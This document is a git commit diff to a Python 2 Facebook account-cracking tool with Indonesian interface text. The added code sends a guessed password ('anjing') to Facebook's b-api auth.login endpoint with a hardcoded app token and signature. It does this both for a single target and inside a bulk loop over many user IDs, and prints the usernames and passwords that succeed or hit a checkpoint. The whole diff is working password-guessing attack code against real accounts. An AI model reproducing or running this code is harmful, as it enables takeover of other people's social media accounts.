ce97f02e52a7e40f4db3e4880a30c863dfda0425
Santri Cyber <51091995+SantriCyber@users.noreply.github.com>
2019-06-24 01:55:16 +0700

    Add files via upload

--- santri-IDNv2.py
+++ santri-IDNv2.py
@@ -454,10 +454,30 @@ def mini():
                                                     raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                                                     menu_hack()
                                                 else:
-                                                    print '\x1b[1;91m[!] Maaf, gagal membuka password target :('
-                                                    print '\x1b[1;91m[!] Cobalah dengan cara lain.'
-                                                    raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
-                                                    menu_hack()
+                                                    pz6 = ('anjing')
+                                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                                                    y = json.load(data)
+                                                    if 'access_token' in y:
+                                                        print '\x1b[1;91m[+] \x1b[1;92mDitemukan.'
+                                                        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : ' + a['name']
+                                                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
+                                                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz6
+                                                        raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+                                                        menu_hack()
+                                                    else:
+                                                        if 'www.facebook.com' in y['error_msg']:
+                                                            print '\x1b[1;91m[+] \x1b[1;92mDitemukan.'
+                                                            print '\x1b[1;91m[!] \x1b[1;93mAkun kena Checkpoint'
+                                                            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : ' + a['name']
+                                                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
+                                                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz6
+                                                            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+                                                            menu_hack()
+                                                        else:
+                                                            print '\x1b[1;91m[!] Maaf, gagal membuka password target :('
+                                                            print '\x1b[1;91m[!] Cobalah dengan cara lain.'
+                                                            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+                                                            menu_hack()
         except KeyError:
             print '\x1b[1;91m[!] Terget not found'
             raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
@@ -700,8 +720,15 @@ def pilih_super():
                                             else:
                                                 if 'www.facebook.com' in q['error_msg']:
                                                     print '\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass5
-
-                                                    
+                                                else:
+                                                    pass6 = ('anjing')
+                                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                                                    q = json.load(data)
+                                                    if 'access_token' in q:
+                                                        print '\x1b[1;97m[\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass6
+                                                    else:
+                                                        if 'www.facebook.com' in q['error_msg']:
+                                                            print '\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass6
         except:
             pass
 
